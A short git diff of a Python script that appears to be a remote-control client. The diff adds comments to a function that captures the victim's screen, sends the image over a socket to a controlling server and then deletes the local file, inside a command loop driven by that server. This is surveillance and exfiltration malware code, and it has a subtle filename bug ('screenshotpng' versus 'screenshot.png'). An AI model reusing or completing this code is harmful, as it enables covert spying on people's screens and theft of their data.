@@ -7,12 +7,14 @@ import os
 from PIL import ImageGrab
 
 
+# take a screenshot
 def screenshot():
     shot = ImageGrab.grab()
     shot.save(f'screenshotpng')
     shot.close()
 
 
+# upload a file to client's machine
 def upload(file):
     f = open(file, 'rb')
     client.send(f.read())
@@ -34,8 +36,13 @@ while True:
     elif comm == '':
         pass
     elif comm == 'screenshot':
+        # take the screenshot
         screenshot()
+
+        # send to the server
         upload('screenshot.png')
+
+        # delete from the client's machine
         os.remove('screenshot.png')
     else:
         try:
